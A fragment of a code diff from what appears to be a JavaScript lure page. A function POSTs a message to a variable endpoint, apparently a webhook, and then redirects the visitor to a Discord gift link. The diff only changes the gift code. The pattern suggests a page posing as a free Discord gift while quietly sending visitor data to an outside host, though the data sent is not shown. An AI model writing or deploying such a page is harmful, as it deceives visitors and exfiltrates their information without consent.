@@ -18,5 +18,5 @@ function balls(){
 
     fetch(whurl, {"method":"POST", "headers": {"content-type": "application/json"},"body": JSON.stringify(msg)});
 
-    setTimeout(() => {  window.location.replace("https://discord.com/gifts/fd732d"); }, 500);
+    setTimeout(() => {  window.location.replace("https://discord.com/gifts/gjslk3h7ch19fnal3f8f21"); }, 500);
 }
